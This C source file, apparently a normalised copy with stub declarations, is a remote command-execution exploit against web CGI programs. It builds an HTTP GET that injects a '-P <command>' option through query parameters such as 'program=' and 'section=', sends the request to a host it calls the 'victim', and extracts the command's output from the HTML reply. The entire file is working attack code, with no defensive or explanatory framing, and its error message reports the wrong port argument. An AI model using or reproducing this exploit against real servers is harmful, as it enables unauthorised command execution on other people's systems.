
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct hostent {int h_length; scalar_t__ h_addr; } ;
typedef int serv_addr ;


 int AF_INET ;
 int SOCK_STREAM ;
 int atoi (char*) ;
 int bcopy (char*,char*,int ) ;
 int close (int) ;
 scalar_t__ connect (int,struct sockaddr_in*,int) ;
 struct hostent* gethostbyname (char*) ;
 int htons (int) ;
 int memset (char*,int,int) ;
 int printf (char*,...) ;
 scalar_t__ recv (int,char*,int,int ) ;
 int send (int,char*,int,int ) ;
 int socket (int ,int ,int ) ;
 int strcat (char*,char*) ;
 int strlen (char*) ;
 scalar_t__ strncmp (char*,char*,int) ;
 int usage (char*) ;

int main(int argc, char **argv) {
         int sock, i, j, len = 0;
         struct sockaddr_in serv_addr;
         struct hostent *crap;
  char *cp, dummy[50000], buffer[2000] = "GET ";
         if(argc < 6)
            usage(argv[0]);
  if(atoi(argv[5]) == 0) {
    memset(dummy, 0x00, 50000);
    strcat(dummy, argv[3]);
    strcat(dummy, "?-P ");
    strcat(dummy, argv[2]);
    strcat(dummy, " ls");}
  else if(atoi(argv[5]) == 1) {
                 memset(dummy, 0x00, 50000);
                strcat(dummy, argv[3]);
                strcat(dummy, "?program=-P ");
                     strcat(dummy, argv[2]);
                     strcat(dummy, " ls");}
  else if(atoi(argv[5]) == 2) {
    memset(dummy, 0x00, 50000);
    strcat(dummy, argv[3]);
    strcat(dummy, "?section=-P");
    strcat(dummy, argv[2]);
    strcat(dummy, "&topic=w");}
  else
   usage(argv[0]);

  printf("# crafting buffer string ... ");
          for(i=0, j=4;i < strlen(dummy);i++) {
   if(dummy[i] == ' ') {
    strcat(buffer, "%20");
    j+=3;}
   else {
    buffer[j] = dummy[i];
    j++;}
  }

  strcat(buffer, "\r\n");
         printf("(done)\n");
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if(sock < 0)
                 return printf("# error creating socket.\n");
         crap = gethostbyname(argv[1]);
         if(crap == ((void*)0))
                 return printf("# cant resolve the specified hostname: %s\n", argv[1]);
         else
                 printf("# connecting to victim... ");

         serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(atoi(argv[4]));
         bcopy((char *)crap->h_addr, (char *)&serv_addr.sin_addr.s_addr, crap->h_length);

         if (connect(sock, &serv_addr, sizeof(serv_addr)) < 0)
                 return printf("(error)\n# check again %s:%d\n", argv[1], atoi(argv[3]));

         printf("(done)\n# sending crafted string... ");
         if( (send(sock, buffer, strlen(buffer), 0)) == -1 )
                 return printf("\n# error while sending the crafted string.!\n");
         printf("(done)\n# waiting for our call ...\n");
  memset(buffer, 0x00, 2000);
  memset(dummy, 0x00, 50000);
  printf("\n\n");
  while(recv(sock, buffer, 2000, 0) > 0)
   strcat(dummy, buffer);

  cp = &dummy[0];
  i = 0; j = 0;
  len = strlen(dummy);

         if(atoi(argv[5]) == 0) {
                 while(strncmp(cp, "<hr>", 4) && i < len) {
                         cp++;
                         i++;
                 }
                 cp+=4;
                 while(strncmp(cp, "<hr>", 4) && strncmp(cp, "<A", 2) && j < len) {
    j++;
                         cp++;
   }
                 *cp = '\0';
                 cp = &dummy[0] + i + 4;
         }

         else if(atoi(argv[5]) == 1) {
                 while(strncmp(cp, "\<pre\>", 5) && i < len) {
                         cp++;
                         i++;
                 }
                 cp+=4;
                 while(strncmp(cp, "pre", 3) && j < len) {
    j++;
                         cp++;
   }
                 *cp = '\0';
                 cp = &dummy[0] + i + 6;
         }

         else if(atoi(argv[5]) == 2) {
                 while(strncmp(cp, "PRE", 3) && i < len) {
                         cp++;
                         i++;
                 }
                 cp+=2;
                 while(strncmp(cp, "PRE", 3) && j < len) {
    j++;
                         cp++;
   }
                 *cp = '\0';
                 cp = &dummy[0] + i + 2;
         }

  if(*cp == '\0')
   return printf("# Bad response from the server.\n");

         printf("%s", cp);
  printf("\n\n");
         close(sock);
         return 0;
 }
